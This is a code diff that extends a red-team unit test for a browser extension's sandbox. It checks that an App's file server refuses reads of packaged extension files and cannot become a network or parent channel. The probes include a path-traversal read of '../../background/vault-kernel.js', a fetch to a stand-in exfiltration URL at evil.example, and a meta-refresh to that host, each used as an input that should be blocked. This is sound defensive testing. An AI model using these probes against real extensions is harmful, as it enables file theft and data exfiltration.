@@ -24,7 +24,7 @@ import {
 import { applyNotebookRealmSeal } from '../../../extension/engine-tabs/notebook-tab/notebook-neutralizers.js';
 import { resolveRelativePath } from '../../../extension/peerd-engine/module-resolver.js';
 import { opfsHelpers } from '../../../extension/peerd-engine/opfs.js';
-import { composeApp, stripMetaRefresh } from '../../../extension/peerd-engine/app-compose.js';
+import { APP_FILES_HANDOFF, composeApp, stripMetaRefresh } from '../../../extension/peerd-engine/app-compose.js';
 import { normalizeRequest, needsWebWriteConfirm } from '../../../extension/peerd-engine/vm-net/http-bridge.js';
 import {
   buildAppEgressBlockRule,
@@ -80,7 +80,7 @@ export const scenario: Scenario = {
   title: 'Sandbox escape (Notebook/Pod workers, App iframe, WebVM)',
   adversary: 'malicious sandboxed code',
   asset: 'the host origin, the network, and other sandbox instances',
-  claim: 'Across all three sandbox kinds, confinement holds: the Notebook realm exposes only the audited fetch bridge (raw channels throw, native fetch unrecoverable, bridge un-unseatable) and no same-origin durable store; the Cache API and IndexedDB both throw, so the sealed extension-origin worker cannot reach the `peerd` database; OPFS mutation is checked before any root handle is opened; a remote module restricts its whole run to compute only and all remote-controlled output is fenced; an App cannot break out of its iframe or observe a targeted actor job; and the WebVM HTTP bridge refuses non-http(s) schemes, scrubs CRLF header injection, drops any smuggled auth field, and confirms body-bearing verbs.',
+  claim: 'Across all three sandbox kinds, confinement holds: the Notebook realm exposes only the audited fetch bridge (raw channels throw, native fetch unrecoverable, bridge un-unseatable) and no same-origin durable store; the Cache API and IndexedDB both throw, so the sealed extension-origin worker cannot reach the `peerd` database; OPFS mutation is checked before any root handle is opened; a remote module restricts its whole run to compute only and all remote-controlled output is fenced; an App cannot break out of its iframe, read packaged extension files through its file server, or observe a targeted actor job; and the WebVM HTTP bridge refuses non-http(s) schemes, scrubs CRLF header injection, drops any smuggled auth field, and confirms body-bearing verbs.',
   threatModelRef: 'INV-6',
   tier: 'unit',
   async run() {
@@ -232,6 +232,47 @@ export const scenario: Scenario = {
         ? blocked('embed </script> in an inlined App worker to break out of the shim', 'worker source `<` escaped to \\u003c, no executable breakout tag')
         : leaked('embed </script> in an inlined App worker to break out of the shim', 'raw </script><script> survived into the document'));
 
+      // The App's in-realm file server answers its loader's fetch/XHR reads.
+      // It must answer extension-origin paths itself, and pass every other
+      // URL only to the native call that the sandbox CSP refuses.
+      const composedGame = composeApp({ 'index.html': '<!doctype html><title>Game</title>' }, 'index.html');
+      const serverScript = /<script data-peerd-file-server>([\s\S]*?)<\/script>/.exec(composedGame)?.[1] ?? '';
+      const nativeCalls: string[] = [];
+      const parentPosts: unknown[] = [];
+      const appWindow: Record<string, unknown> = {
+        location: { href: 'chrome-extension://red-team/engine-tabs/app-tab/runner.html#1' },
+        fetch: (input: unknown) => {
+          nativeCalls.push(String(input));
+          return Promise.reject(new TypeError('refused by connect-src'));
+        },
+        XMLHttpRequest: class extends EventTarget {},
+        ProgressEvent: Event,
+        parent: { postMessage: (message: unknown) => parentPosts.push(message) },
+        postMessage: (message: unknown) => parentPosts.push(message),
+        Blob, DOMException, Event, Request, Response, TextDecoder, URL,
+        [APP_FILES_HANDOFF]: { 'game.wasm': new Uint8Array([0, 97, 115, 109]).buffer },
+      };
+      // eslint-disable-next-line no-new-func
+      new Function('self', serverScript)(appWindow);
+      const appFetch = appWindow.fetch as (input: string) => Promise<Response>;
+      const packagedStatuses = await Promise.all(['/manifest.json', '../../background/vault-kernel.js']
+        .map(async (path) => (await appFetch(path)).status));
+      probes.push(packagedStatuses.every((status) => status === 404) && nativeCalls.length === 0
+        ? blocked('read packaged extension files through the App file server',
+          '/manifest.json and ../../background/vault-kernel.js get a 404 in the App realm; the native fetch never ran')
+        : leaked('read packaged extension files through the App file server',
+          `statuses=${JSON.stringify(packagedStatuses)} native=${JSON.stringify(nativeCalls)}`));
+
+      await appFetch('https://evil.example/exfil').catch(() => {});
+      const missingStatus = (await appFetch('missing.data')).status;
+      const noNewChannel = JSON.stringify(nativeCalls) === '["https://evil.example/exfil"]'
+        && missingStatus === 404 && parentPosts.length === 0 && !serverScript.includes('postMessage');
+      probes.push(noNewChannel
+        ? blocked('turn the App file server into a network or parent-file channel',
+          'a remote URL reaches only the native fetch the CSP refuses; a missing file is a local 404 with no parent request')
+        : leaked('turn the App file server into a network or parent-file channel',
+          `native=${JSON.stringify(nativeCalls)} missing=${missingStatus} parentPosts=${parentPosts.length}`));
+
       const refreshed = stripMetaRefresh('<head><meta content="0;url=//evil.example" http-equiv=refresh></head>');
       const noRefresh = !/http-equiv\s*=\s*["']?refresh/i.test(refreshed);
       probes.push(noRefresh
@@ -330,6 +371,7 @@ export const scenario: Scenario = {
       'opfsHelpers (host-side mutation posture before root access)',
       'buildWorkerSource + formatEvalResult (remote graph capability collapse + output fence)',
       'composeApp + stripMetaRefresh (App iframe breakout/navigation defense)',
+      'serveAppFiles (App file server: extension-origin 404s, no new network or parent channel)',
       'buildAppEgressBlockRule (tab-scoped HTTP(S)/WebSocket network floor)',
       'makeOffscreenActorChannelClient (exact-client channel transfer)',
       'normalizeRequest + needsWebWriteConfirm (WebVM bridge scheme/CRLF/auth/confirm)',
@@ -346,6 +388,7 @@ export const scenario: Scenario = {
       'tests/peerd-engine/single-module-linker.test.ts (seal-first graph with no child loads)',
       'extension/tests/unit/red-team/sandbox-escape.test.js (in-browser red-team framing)',
       'scripts/cdp/states.mjs actor-builds-app (live App raw-network capture)',
+      'scripts/cdp/states.mjs app-file-server (live App file server in the manifest sandbox)',
       'scripts/firefox/run-runtime-tests.mjs (opaque worker host, string-compilation refusal, cancellable compiler and fetch, local and remote graph parity)',
       'scripts/cdp/states.mjs actor-channel-targeting (live sibling-observer probe)',
       'scripts/cdp/states.mjs notebook-remote-restricted (live visible-Notebook host wall)',
